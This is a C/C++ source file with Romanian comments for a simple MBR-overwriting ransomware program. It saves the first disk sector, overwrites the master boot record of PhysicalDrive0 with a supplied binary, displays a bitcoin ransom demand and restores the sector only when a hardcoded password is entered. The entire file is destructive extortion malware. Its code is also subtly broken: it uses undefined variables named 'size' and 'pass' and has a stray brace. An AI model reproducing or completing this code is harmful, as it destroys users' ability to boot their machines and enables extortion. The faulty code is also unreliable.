#include <windows.h>
#include <conio.h>
#include <stdio.h>
#define BLOCK_SIZE 512


/**Functie folosita pentru a citii un sector de pe disk
    Param: _dsk - Disk-ul de pe care citim
            _buff -Bufferul in care citim
            _nsect - sectorul pe care il citim, fiecare sector are 512 bytes.
*/
short ReadSect (const char *_dsk,char *&_buff,unsigned int _nsect){
  DWORD dwRead;   
  HANDLE hDisk=CreateFile(_dsk,GENERIC_READ,FILE_SHARE_VALID_FLAGS,0,OPEN_EXISTING,0,0);
  if(hDisk==INVALID_HANDLE_VALUE) 
    {  
       CloseHandle(hDisk);
       printf("Couldn't Coppy MBR\n");
       return 1;
    }
  SetFilePointer(hDisk,_nsect*512,0,FILE_BEGIN); 

  ReadFile(hDisk,_buff,512,&dwRead,0); 
  CloseHandle(hDisk);
  return 0;
}


//Functie folosita pentru a citii MBR-ul de pe disk.
char* readMBR(){
    char *dsk="\\\\.\\PhysicalDrive0";
    //Sector 0 = first 512 bytes = MBR
    int sector=0;

    char *buff=new char[BLOCK_SIZE];
    ReadSect(dsk,buff,sector);

    return buff;
}

//Functie folosita pentru a suprascrie MBR-ul
//Arg: pathToBin - calea catre binarul ce va fi scris peste mbr.
void overWriteMBR(char* pathToBin){
    DWORD dw;

    //Orice device de stocare poate fi bootabil, PhysicalDrive0 reprezinta HardDisk-ul (In cazul in care este unul singur)
    //Putem inlocui cu litera unui dispozitiv de memorie(stick USB) \\.\I:
    HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0); //Deschide fisierul binar
        if (binary != INVALID_HANDLE_VALUE){
            DWORD size = GetFileSize(binary, 0); // Afla dimensiunea fisierului BINAR 
            if (size > 0){
                byte *mbr = new byte[size]; 
                if (ReadFile(binary, mbr, size, &dw, 0)){ //Citeste continutul binar-ului si stocheaza in bufer-ul mbr
                    printf("Binary file successfuly read!\n");
                    if (WriteFile(drive, mbr, size, &dw, 0)){
                        printf("First sector overritten successfuly!\n"); //Suprascrie MBR-ul
                    }
                    else
                        printf("Fatal error! Can't override 1st sector!\n");
                }
                else
                    printf("Error reading from binary file!\n");
            }
            else
                printf("Invalid binary file!\n");
        }
        else{
            printf("Can't find the binary file to read from!\n");
        }
        CloseHandle(binary);
    }
    else
        printf("Administrator privileges required!\n");
    CloseHandle(drive);
    _getch();

}

void restoreMBR(char* localMBR){

    DWORD dw;
    HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        byte *mbr = new byte[BLOCK_SIZE]; 
            //Copiaza continutul mbr-ului vechi in buffer
            memcpy(mbr,localMBR,BLOCK_SIZE);
            //Suprascrie MBR-ul
            if (WriteFile(drive, mbr, size, &dw, 0)){
                printf("First sector restored successfuly!\n"); //Suprascrie MBR-ul
            }
            else
                printf("Fatal error! Can't override 1st sector!\n");
    }
    else
        printf("Administrator privileges required!\n");
    
    CloseHandle(drive);
}

}

int main(){
    //Salvam MBR-ul 
    char* localMBR = readMBR();
    overWriteMBR("data.bin");
    printf("Your MBR has been overwritten\n");
    printf("Pay 10000000 $$ in bitcoin to MasterHacker200 in order to get your MBR back\n");
    printf("After your payment you will receive a password\n");
    printf("Closing this program will cause you to lose all your files!");
    int passVal= 500;
    int input =0;
    int count = 3;
    while(count != 0){
        printf("You have %d attempts left\n",count);
        printf("Enter pass number: \n");
        scanf("%d",&input);
        if(input == pass){
            printf("Well done....trying to restore your MBR! fingers crossed\n");
            restoreMBR(localMBR);
            return 0;
        }
        count--;
    }
    printf(" :( - Bye\n");
 return 0;   
}